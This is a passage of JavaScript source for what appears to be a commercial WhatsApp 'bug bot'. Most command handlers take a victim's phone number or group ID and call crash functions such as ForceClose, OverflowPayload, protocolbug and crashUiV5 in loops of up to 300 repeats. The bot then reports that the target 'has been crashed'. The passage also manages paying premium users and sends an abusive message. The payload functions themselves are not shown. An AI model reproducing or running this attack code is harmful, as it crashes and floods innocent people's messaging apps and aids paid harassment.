\`🧸 𝗣 𝗥 𝗢 𝗖 𝗘 𝗦 𝗦\`
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" // Ganti URL gambar sesuai kebutuhan
        },
        caption: Menu,
        footer: `</> [ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ] </>`,
        buttons: [
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝐁͢𝐮𝐲 𝐒𝐜͢𝐫𝐢𝐩𝐭᭄'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });

    // Simulasi waktu proses
    let startTime = Date.now();

    for (let i = 0; i < 50; i++) {
        await GxhorseForceClose(target) 
        await GxhorseForceClose(target) 
        await GxhorseForceClose(target) 
        await GxhorseForceClose(target)  
        await VampFcSpam(target)
        await VampHardUi(target, Ptcp = false)
        await VampPrivateBlank(target)
    }
    await sleep(1000);

    // Waktu selesai
    let endTime = Date.now();
    let elapsedTime = ((endTime - startTime) / 1000).toFixed(2);

    // Kirim hasil akhir
    const resultImageUrl = 'https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg'; // Ganti URL sesuai kebutuhan
    const resultCaption =`
\`🧸 𝗗 𝗢 𝗡 𝗘\`
> ᴛᴀʀɢᴇᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴀsʜᴇᴅ
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: resultImageUrl
        },
        caption: resultCaption,
        footer: "</> [ 𝗗𝗼𝗻𝗲 𝗕𝗿𝗼 ] </>",
        buttons: [
            {
                buttonId: ".menu", 
                buttonText: {
                    displayText: '𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂'
                }
            },
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝗕𝘂𝘆 𝗦𝗰𝗿𝗶𝗽𝘁'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });
}
break;

case "flowfc": {
    if (!Access) return m.reply(mess.owner);
    let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    if (!target) return m.reply("Gunakan tombol dengan benar!");

    // Mengirim gambar, caption, dan button saat proses
    let Menu = `
\`🧸 𝗣 𝗥 𝗢 𝗖 𝗘 𝗦 𝗦\`
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" // Ganti URL gambar sesuai kebutuhan
        },
        caption: Menu,
        footer: `</> [ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ] </>`,
        buttons: [
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝐁͢𝐮𝐲 𝐒𝐜͢𝐫𝐢𝐩𝐭᭄'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });

    // Simulasi waktu proses
    let startTime = Date.now();

    for (let i = 0; i < 50; i++) {
        await SpaceGroup(target) 
        await SpaceGroup(target) 
        await GxhorseForceClose(target) 
        await GxhorseForceClose(target)  
        await VampFcSpam(target)
        await VampHardUi(target, Ptcp = false)
        await VampPrivateBlank(target)
    }
    await sleep(1000);

    // Waktu selesai
    let endTime = Date.now();
    let elapsedTime = ((endTime - startTime) / 1000).toFixed(2);

    // Kirim hasil akhir
    const resultImageUrl = 'https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg'; // Ganti URL sesuai kebutuhan
    const resultCaption =`
\`🧸 𝗗 𝗢 𝗡 𝗘\`
> ᴛᴀʀɢᴇᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴀsʜᴇᴅ
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: resultImageUrl
        },
        caption: resultCaption,
        footer: "</> [ 𝗗𝗼𝗻𝗲 𝗕𝗿𝗼 ] </>",
        buttons: [
            {
                buttonId: ".menu", 
                buttonText: {
                    displayText: '𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂'
                }
            },
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝗕𝘂𝘆 𝗦𝗰𝗿𝗶𝗽𝘁'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });
}
break;

case "tesbug2": {
    if (!Access) return m.reply(mess.owner);
    let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    if (!target) return m.reply("Gunakan tombol dengan benar!");

    // Mengirim gambar, caption, dan button saat proses
    let Menu = `
\`🧸 𝗣 𝗥 𝗢 𝗖 𝗘 𝗦 𝗦\`
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" // Ganti URL gambar sesuai kebutuhan
        },
        caption: Menu,
        footer: `</> [ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ] </>`,
        buttons: [
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝐁͢𝐮𝐲 𝐒𝐜͢𝐫𝐢𝐩𝐭᭄'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });

    // Simulasi waktu proses
    let startTime = Date.now();

    for (let i = 0; i < 50; i++) {
        await OverflowPayload(target) 
        await OverflowPayload(target) 
        await OverflowPayload(target) 
        await OverflowPayload(target) 
    }
    await sleep(1000);

    // Waktu selesai
    let endTime = Date.now();
    let elapsedTime = ((endTime - startTime) / 1000).toFixed(2);

    // Kirim hasil akhir
    const resultImageUrl = 'https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg'; // Ganti URL sesuai kebutuhan
    const resultCaption =`
\`🧸 𝗗 𝗢 𝗡 𝗘\`
> ᴛᴀʀɢᴇᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴀsʜᴇᴅ
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: resultImageUrl
        },
        caption: resultCaption,
        footer: "</> [ 𝗗𝗼𝗻𝗲 𝗕𝗿𝗼 ] </>",
        buttons: [
            {
                buttonId: ".menu", 
                buttonText: {
                    displayText: '𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂'
                }
            },
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝗕𝘂𝘆 𝗦𝗰𝗿𝗶𝗽𝘁'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });
}
break;

case "tesbug3": {
    if (!Access) return m.reply(mess.owner);
    let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    if (!target) return m.reply("Gunakan tombol dengan benar!");

    // Mengirim gambar, caption, dan button saat proses
    let Menu = `
\`🧸 𝗣 𝗥 𝗢 𝗖 𝗘 𝗦 𝗦\`
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" // Ganti URL gambar sesuai kebutuhan
        },
        caption: Menu,
        footer: `</> [ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ] </>`,
        buttons: [
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝐁͢𝐮𝐲 𝐒𝐜͢𝐫𝐢𝐩𝐭᭄'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });

    // Simulasi waktu proses
    let startTime = Date.now();

    for (let i = 0; i < 50; i++) {
        await protocolbug4(target) 
        await protocolbug4(target) 
        await protocolbug4(target) 
        await protocolbug4(target) 
    }
    await sleep(1000);

    // Waktu selesai
    let endTime = Date.now();
    let elapsedTime = ((endTime - startTime) / 1000).toFixed(2);

    // Kirim hasil akhir
    const resultImageUrl = 'https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg'; // Ganti URL sesuai kebutuhan
    const resultCaption =`
\`🧸 𝗗 𝗢 𝗡 𝗘\`
> ᴛᴀʀɢᴇᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴀsʜᴇᴅ
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: resultImageUrl
        },
        caption: resultCaption,
        footer: "</> [ 𝗗𝗼𝗻𝗲 𝗕𝗿𝗼 ] </>",
        buttons: [
            {
                buttonId: ".menu", 
                buttonText: {
                    displayText: '𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂'
                }
            },
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝗕𝘂𝘆 𝗦𝗰𝗿𝗶𝗽𝘁'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });
}
break;

case "flowdex": {
    if (!Access) return m.reply(mess.owner);
    let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    if (!target) return m.reply("Gunakan tombol dengan benar!");

    // Mengirim gambar, caption, dan button saat proses
    let Menu = `
\`🧸 𝗣 𝗥 𝗢 𝗖 𝗘 𝗦 𝗦\`
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" // Ganti URL gambar sesuai kebutuhan
        },
        caption: Menu,
        footer: `</> [ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ] </>`,
        buttons: [
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝐁͢𝐮𝐲 𝐒𝐜͢𝐫𝐢𝐩𝐭᭄'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });

    // Simulasi waktu proses
    let startTime = Date.now();

    for (let i = 0; i < 50; i++) {
        await xcrash_invisLoop(target) 
        await xcrash_invisLoop(target) 
        await xcrash_invisLoop(target) 
        await xcrash_invisLoop(target) 
    }
    await sleep(10);

    // Waktu selesai
    let endTime = Date.now();
    let elapsedTime = ((endTime - startTime) / 1000).toFixed(2);

    // Kirim hasil akhir
    const resultImageUrl = 'https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg'; // Ganti URL sesuai kebutuhan
    const resultCaption =`
\`🧸 𝗗 𝗢 𝗡 𝗘\`
> ᴛᴀʀɢᴇᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴀsʜᴇᴅ
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: resultImageUrl
        },
        caption: resultCaption,
        footer: "</> [ 𝗗𝗼𝗻𝗲 𝗕𝗿𝗼 ] </>",
        buttons: [
            {
                buttonId: ".menu", 
                buttonText: {
                    displayText: '𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂'
                }
            },
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝗕𝘂𝘆 𝗦𝗰𝗿𝗶𝗽𝘁'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });
}
break;

case "invisxproto": {
    if (!Access) return m.reply(mess.owner);
    let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    if (!target) return m.reply("Gunakan tombol dengan benar!");

    // Mengirim gambar, caption, dan button saat proses
    let Menu = `
\`🧸 𝗣 𝗥 𝗢 𝗖 𝗘 𝗦 𝗦\`
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" // Ganti URL gambar sesuai kebutuhan
        },
        caption: Menu,
        footer: `</> [ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ] </>`,
        buttons: [
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝐁͢𝐮𝐲 𝐒𝐜͢𝐫𝐢𝐩𝐭​᭄'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });

    // Simulasi waktu proses
    let startTime = Date.now();

    for (let i = 0; i < 300; i++) {
        await protocolbug1(target)
await protocolbug2(target)
await protocolbug3(target)
await delayCrash(target, mention = true);
await delayCrash(target, mention = false);
    }

    // Waktu selesai
    let endTime = Date.now();
    let elapsedTime = ((endTime - startTime) / 1000).toFixed(2);

    // Kirim hasil akhir
    const resultImageUrl = 'https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg'; // Ganti URL sesuai kebutuhan
    const resultCaption =`
\`🧸 𝗗 𝗢 𝗡 𝗘\`
> ᴛᴀʀɢᴇᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴀsʜᴇᴅ
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: resultImageUrl
        },
        caption: resultCaption,
        footer: "</> [ 𝗗𝗼𝗻𝗲 𝗕𝗿𝗼 ] </>",
        buttons: [
            {
                buttonId: ".menu", 
                buttonText: {
                    displayText: '𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂'
                }
            },
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝗕𝘂𝘆 𝗦𝗰𝗿𝗶𝗽𝘁'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });
}
break;

case "beta": {
    if (!Access) return m.reply(mess.owner);
    let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    if (!target) return m.reply("Gunakan tombol dengan benar!");

    // Mengirim gambar, caption, dan button saat proses
    let Menu = `
\`🧸 𝗣 𝗥 𝗢 𝗖 𝗘 𝗦 𝗦\`
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" // Ganti URL gambar sesuai kebutuhan
        },
        caption: Menu,
        footer: `</> [ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 ] </>`,
        buttons: [
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝐁͢𝐮𝐲 𝐒𝐜͢𝐫𝐢𝐩𝐭​᭄'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });

    // Simulasi waktu proses
    let startTime = Date.now();

    for (let i = 0; i < 100; i++) {     
await CrashXUiKiller(target, ptcp = true);
await CrashXUiKiller(target, ptcp = false);
await FlowXsx(target);
await CursorimgDoc(target);
await FHorseXFlowButton(target);
await FlowX(target, Amount);
}

    // Waktu selesai
    let endTime = Date.now();
    let elapsedTime = ((endTime - startTime) / 1000).toFixed(2);

    // Kirim hasil akhir
    const resultImageUrl = 'https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg'; // Ganti URL sesuai kebutuhan
    const resultCaption = `
\`🧸 𝗗 𝗢 𝗡 𝗘\`
> ᴛᴀʀɢᴇᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴀsʜᴇᴅ
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: resultImageUrl
        },
        caption: resultCaption,
        footer: "</> [ 𝗗𝗼𝗻𝗲 𝗕𝗿𝗼 ] </>",
        buttons: [
            {
                buttonId: ".menu", 
                buttonText: {
                    displayText: '𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂'
                }
            },
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝐁͢𝐮𝐲 𝐒𝐜͢𝐫𝐢𝐩𝐭​᭄'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });
}
break;   

case 'delay-stc': {
if (!Access) return m.reply(` Khusus Premium `)
if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
let dit = q.replace(/[^0-9]/g, "")
if (dit.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628×××`)
let isTarget = dit + '@s.whatsapp.net'
let DoneBug = `⌊\`𝗦𝗨𝗖𝗖𝗘𝗦𝗦 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧\`⌉
𝗧𝗮𝗿𝗴𝗲𝘁 : ${dit}
𝗧𝘆𝗽𝗲 : DELAY-STC

𝗡𝗢𝗧𝗘
> Jeda beberapa menit biar panel ga kenon`
await FadelSM.sendMessage(from, { image: { url: `https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg` },
caption: DoneBug,
gifPlayback: false,
}, { quoted: m });
for (let r = 0; r < 320; r++) {  
await DelayStc(isTarget)
await sleep(40000)
console.log("succes sending stc delay")
}
}
break;

case 'protoxaudio': {
if (!Access) return m.reply(` Khusus Premium `)
if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
let dit = q.replace(/[^0-9]/g, "")
if (dit.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628×××`)
let isTarget = dit + '@s.whatsapp.net'
let DoneBug = `⌊\`𝗦𝗨𝗖𝗖𝗘𝗦𝗦 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧\`⌉
𝗧𝗮𝗿𝗴𝗲𝘁 : ${dit}
𝗧𝘆𝗽𝗲 : PROTOXAUDIO

𝗡𝗢𝗧𝗘
> Jeda beberapa menit biar panel ga kenon`
await FadelSM.sendMessage(from, { image: { url: `https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg` },
caption: DoneBug,
gifPlayback: false,
}, { quoted: m });
for (let r = 0; r < 320; r++) {  
await ProtoXAudio(isTarget)
await sleep(50000)
console.log("succes sending audio delay")
}
}
break;

case "combinegcor": {
    if (!Access) return m.reply(mess.owner);
    let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    if (!target) return m.reply("Gunakan tombol dengan benar!");

    // Mengirim gambar, caption, dan button saat proses
    let Menu = `
\`🧸 𝗣 𝗥 𝗢 𝗖 𝗘 𝗦 𝗦\`
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" // Ganti URL gambar sesuai kebutuhan
        },
        caption: Menu,
        footer: `</> [ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 ] </>`,
        buttons: [
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝗕𝘂𝘆 𝗦𝗰𝗿𝗶𝗽𝘁'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });

    // Simulasi waktu proses
    let startTime = Date.now();

    for (let i = 0; i < 15; i++) {
await StxCuiSh(target);
await FHorseXFlowButton(target);
await FlowX(target);
await eagleForceClose(target);
await nullQ(target);
await StxCuiSh(target);
await eagleForceClose(target);
await nullQ(target);
await StxCuiSh(target);
await eagleForceClose(target);
await nullQ(target);
await StxCuiSh(target);
await eagleForceClose(target);
await nullQ(target);
await StxCuiSh(target);
await eagleForceClose(target);
await nullQ(target);
await FlowX(target);
await FlowX(target);
await eagleForceClose(target);
await nullQ(target);
await StxCuiSh(target);
await eagleForceClose(target);
await nullQ(target);
await StxCuiSh(target);
await eagleForceClose(target);
await nullQ(target);
await StxCuiSh(target);
await eagleForceClose(target);
await nullQ(target);
await StxCuiSh(target);
await eagleForceClose(target);
await nullQ(target);
await FlowX(target);
await eagleForceClose(target);
await eagleForceClose(target);
await eagleForceClose(target);
await CrashXUiKiller(target, ptcp = true);
await CrashXUiKiller(target, ptcp = false);
await eagleForceClose(target);
await eagleForceClose(target);
await eagleForceClose(target);
await FlowXsx(target);
await CursorimgDoc(target);
await FHorseXFlowButton(target);
await FlowX(target, 999999);
await eagleForceClose(target);
await eagleForceClose(target);
await eagleForceClose(target);
await eagleForceClose(target);
await crashUiV5(target, Ptcp = false);
await systemUi2(target, Ptcp = false);
await eagleForceClose(target);
await crashUiV5(target, Ptcp = true);
await systemUi2(target, Ptcp = true);
await eagleForceClose(target);
await crashUiV5(target, Ptcp = false);
await systemUi2(target, Ptcp = true);
await eagleForceClose(target);
await crashUiV5(target, Ptcp = true);
await systemUi2(target, Ptcp = false);
}

    // Waktu selesai
    let endTime = Date.now();
    let elapsedTime = ((endTime - startTime) / 1000).toFixed(2);

    // Kirim hasil akhir
    const resultImageUrl = 'https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg'; // Ganti URL sesuai kebutuhan
    const resultCaption = `
\`🧸 𝗗 𝗢 𝗡 𝗘\`
> ᴛᴀʀɢᴇᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴀsʜᴇᴅ
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: resultImageUrl
        },
        caption: resultCaption,
        footer: "</> [ 𝗗𝗼𝗻𝗲 𝗕𝗿𝗼 ] </>",
        buttons: [
            {
                buttonId: ".menu", 
                buttonText: {
                    displayText: '𝐁͢𝐮𝐲 𝐒𝐜͢𝐫𝐢𝐩𝐭​᭄'
                }
            },
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝗕𝘂𝘆 𝗦𝗰𝗿𝗶𝗽𝘁'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });
}
break;        

        // END OFF DELAY //
        
        // BEGIN CASE BUG GROUP //
case 'attackgc': {
    if (!Access) return m.reply(mess.owner);
    let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@g.us' : null;
    if (!target) return m.reply("Gunakan tombol dengan benar!");

    // Mengirim gambar, caption, dan button saat proses
    let Menu = `
\`🧸 𝗣 𝗥 𝗢 𝗖 𝗘 𝗦 𝗦\`
𝐆𝐫𝐨𝐮𝐩 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" // Ganti URL gambar sesuai kebutuhan
        },
        caption: Menu,
        footer: `</> [ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 ] </>`,
        buttons: [
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝐁͢𝐮𝐲 𝐒𝐜͢𝐫𝐢𝐩𝐭​᭄'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });

    // Simulasi waktu proses
    let startTime = Date.now();

    for (let i = 0; i < 50; i++) {
            await Loc(groupId);
            await Loc(groupId);
        }

        await sleep(1000);

    // Waktu selesai
    let endTime = Date.now();
    let elapsedTime = ((endTime - startTime) / 1000).toFixed(2);

    // Kirim hasil akhir
    const resultImageUrl = 'https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg'; // Ganti URL sesuai kebutuhan
    const resultCaption = `
\`🧸 𝗗 𝗢 𝗡 𝗘\`
> ɢʀᴏᴜᴘ ʜᴀs ʙᴇᴇɴ ᴄʀᴀsʜᴇᴅ
𝐆𝐫𝐨𝐮𝐩 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: resultImageUrl
        },
        caption: resultCaption,
        footer: "</> [ 𝗗𝗼𝗻𝗲 𝗕𝗿𝗼 ] </>",
        buttons: [
            {
                buttonId: ".menu", 
                buttonText: {
                    displayText: '𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂'
                }
            },
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝐁͢𝐮𝐲 𝐒𝐜͢𝐫𝐢𝐩𝐭​᭄'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });
}
break;  

case 'hidetag': {
    if (!isGroup) return m.reply("Fitur ini hanya bisa digunakan di grup!");
    if (!isBotGroupAdmins) return m.reply("Bot harus menjadi admin untuk menggunakan fitur ini!");
    if (!args.join(" ")) return m.reply("Masukkan pesan untuk disampaikan!");

    let text = args.join(" ");

    let members = participants.map(u => u.id);

    let options = {

        text: text,

        mentions: members

    };

    await FadelSM.sendMessage(m.chat, options, { quoted: m });
    
}

break;
        

case 'addprem': {
    if (!botNumber) return m.reply(mess.owner);
    if (!args[0]) return m.reply(`Mana Nomor Nya Kocak Contoh ${prefix + command} 6285810686347`);
    const prem1 = text.split("|")[0].replace(/[^0-9]/g, '');
    const cek1 = await FadelSM.onWhatsApp(`${prem1}@s.whatsapp.net`);
    if (cek1.length == 0) return m.reply("masukkan nomor yang valid dan terdaftar di WhatsApp!")      
    kontributor.push(prem1);
    fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(kontributor));
    m.reply(`sukses menjadikan ${prem1} sebagai murbug`); 
    FadelSM.sendMessage(`${prem1}@s.whatsapp.net`, { 
        text: `OI KONTOL,SELAMAT YA ANJING LU SEKARANG BAGIAN DARI MURBUG`},{quoted:m}
           );
        }
        break;

case 'delprem': {
    if (!botNumber) return m.reply(mess.owner);
    if (!args[0]) return m.reply(`Mana Nomor Nya Kocak Contoh ${prefix + command} 6285810686347`);
    const prem2 = text.split("|")[0].replace(/[^0-9]/g, '');
            const unp = kontributor.indexOf(prem2);
            if (unp !== -1) {
                kontributor.splice(unp, 1);
                fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(kontributor));
                m.reply(`yah ${prem2} sudah bukan lagi bagian dari murbug`);
            } else {
                m.reply(`${prem2} tidak ada dalam list murbug.`);
            }
        }
        break;

case "public": {
            if (!botNumber) return m.reply(mess.message) 
            FadelSM.public = true
            m.reply(`Sukses Mode Public`)
        }
        break;
        
case 'cekidch': {
 if (!isGroup) return m.reply(`Example: ${prefix + command} <Link>`)
 if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")

 let result = text.split('https://whatsapp.com/channel/')[1]
 let res = await FadelSM.newsletterMetadata("invite", result)
 
 let teks = `* *ID : ${res.id}*
* *Nama :* ${res.name}
* *IdCh :* ${res.id}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: { 
 "messageContextInfo": { 
 "deviceListMetadata": {}, 
 "deviceListMetadataVersion": 2 
 },
 interactiveMessage: {
 body: {
 text: teks 
 }, 
 footer: {
 text: `© 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 V2`
 },
 nativeFlowMessage: {
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
 },
 ]
 }
 }
 }
 }
 }, { quoted: m }); // Menambahkan {quoted: m} di sini
 await FadelSM.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
break;
            
case 'self': {
